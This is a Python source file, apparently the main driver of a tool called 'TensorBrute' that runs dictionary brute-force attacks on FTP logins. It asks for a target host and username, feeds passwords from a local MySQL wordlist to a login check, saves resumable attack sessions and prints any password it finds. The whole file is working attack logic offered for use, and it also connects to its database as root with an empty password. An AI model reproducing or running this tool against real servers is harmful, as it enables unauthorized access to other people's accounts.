import ftp
import sql
import utils
import sys

conn = None

def main():
    # Print our logo
    print(utils.get_logo())
    print("Welcome to TensorBrute, NOOB.\n")
    # Show options
    print(utils.show_ops(),end='')
    # input
    opt = input()
    if opt.strip() == '1':
        newSession()
    elif opt.strip() == '2':
        existingSession()
    else:
        print("Exiting...")

def newSession():
    '''Start a new attack session'''
    global conn
    # connect to the DB if not already connected
    connect()
    # first check if any session is running
    sess = sql.check_running_sessions(conn)
    if sess is not None:
        print("Session",sess,"is already running... Try resuming.")
        end_session(2)
    # no sessions running - start one
    # generate an ID
    id = utils.gen_id()
    # get host IP and username from user
    host = input("FTP Host to attack: ")
    username = input("Target username: ")
    # check FTP server
    res = ftp.check_ftp(host)
    if(res==0):
        end_session(3)
    # Start the session
    print(utils.sess_setup())
    sql.start_session(conn,id,host,username)
    # clean up the flags
    sql.clear_flags(conn)
    # OK - finally ready to start attack
    # print a nice message
    print(utils.attack_start())
    # attack!
    attack_prog(id,host,username)

def existingSession():
    '''Start a new attack session'''
    global conn
    # connect to the DB if not already connected
    connect()
    # look for existing sessions
    sess = sql.check_running_sessions(conn)
    if sess is None:
        print("I don't see any running sessions... Try creating a new one.")
        end_session(2)

    # get host IP and username from user
    host,username = sql.get_session_data(conn,sess)
    # Ready to resume attack
    # print a nice message
    print(utils.attack_resume(host,username))
    # attack!
    attack_prog(sess,host,username)
    

def connect():
    global conn
    if conn is None:
        print(utils.db_connect())
        conn = sql.mysql_connect('localhost','root','','pass_dict')

def attack_prog(id,host,username):
    '''Start/resume an attack.'''
    global conn
    flag = False
    # check if done after every 10 tries
    count = 0
    print(utils.progress_start())
    while True:
        # get a password
        passwd = sql.get_password(conn)
        if passwd is None:
            end_session(1,id)
        # attempt login
        status = ftp.check_cred(host,username,passwd)
        # check
        if status==1:
            # this is it!
            flag = True
            break
        if status is None:
            end_session(3)
        
        # check if it's done!
        if count%10 == 0:
            if not sql.is_session_running(conn,id):
                break
            print(utils.status_update(passwd))
        count+=1
    if flag:
        sql.password_found(conn,id,passwd)
        print()
        print(utils.found_pass(host,username,passwd))
        end_session(0)
    else:
        end_session(4)
        print()

def end_session(status,id=None):
    global conn
    print()
    # success
    if status==0:
        print("Congratulations. Use this power responsibly ;)")
    # passwords have run out
    elif status==1:
        sql.rollback(conn,id)
        print("We have run out of passwords to try, unforunately :(")
        print("Try another Database? :)")
    elif status==3:
        print("Not able to connect to the FTP server. Check the IP/URL?")
    elif status==4:
        print("Session ended. Another system probably found the password!")

    print("Goodbye!")
    sys.exit(status)



if __name__=="__main__":
    main()